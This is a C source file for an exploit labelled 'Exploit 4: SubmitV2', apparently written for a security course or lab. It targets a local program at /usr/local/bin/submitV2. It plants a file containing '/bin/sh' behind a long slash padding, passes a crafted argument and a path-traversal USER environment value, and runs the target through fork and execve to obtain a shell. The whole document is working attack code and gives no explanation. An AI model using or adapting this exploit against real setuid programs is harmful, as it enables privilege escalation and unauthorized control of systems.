/*
 * Exploit 4: SubmitV2
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>

#define TARGET "/usr/local/bin/submitV2"

int main(void) {
  char *args[3];
  char *env[2];
  char argbuff[137];
  int i, len;
  FILE *sc_file;
  pid_t pid;
  int status;

  sc_file = fopen("mkdir", "w");
  if (sc_file == NULL) {
    printf("error");
  }
  for (i = 0; i < 1020; i++) {
    fputc('/', sc_file);
  }
  fputs("/bin/sh", sc_file);
  fclose(sc_file);


  argbuff[0] = '.';
  len = sizeof(argbuff);
  for (i = 1; i < len; i++) {
    argbuff[i] = '/';
  }
  strcpy(argbuff+131, "mkdir");

  args[0] = TARGET;
  args[1] = argbuff; 
  args[2] = NULL;

  env[0] = "USER=../../../bin";
  env[1] = NULL;

	pid = fork();
	// error
	if (pid < 0) {
		fprintf(stderr, "Fork failed\n");
		return 1;
	}
	if (pid > 0) {
		waitpid(pid, &status, 0);
		if (WIFEXITED(status) == 0 || WEXITSTATUS(status) != 0)
      env[0] = "USER=tom";
      args[1] = "mkdir";
      execve(TARGET, args, env);
			return 1;
	}
	else {
    execve(TARGET, args, env);
		return 1;
	}

  return 0;
}
